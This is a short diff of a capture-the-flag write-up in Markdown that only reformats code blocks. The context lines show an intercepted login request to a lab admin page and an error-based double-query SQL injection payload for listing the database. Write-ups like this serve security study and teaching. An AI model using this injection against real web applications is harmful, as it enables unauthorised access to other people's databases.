@@ -206,7 +206,6 @@ By intercepting the request with burpsuite we can see how the data is processed
 Let’s go with the easy way, we start by saving the request in a filerequest
 
 ```console
-
 $ cat request
 POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1  
 Host: www.securewebinc.jet
@@ -324,7 +323,7 @@ We saw that it can be listed with a `sql injection` time based, however when sen
 
 Based on an [article](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/) we can create one `query` for a sqli `error` based `doble query` to list the database in use `withdatabase()`
 
-```query
+```console
 ' or (select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
 ```
 
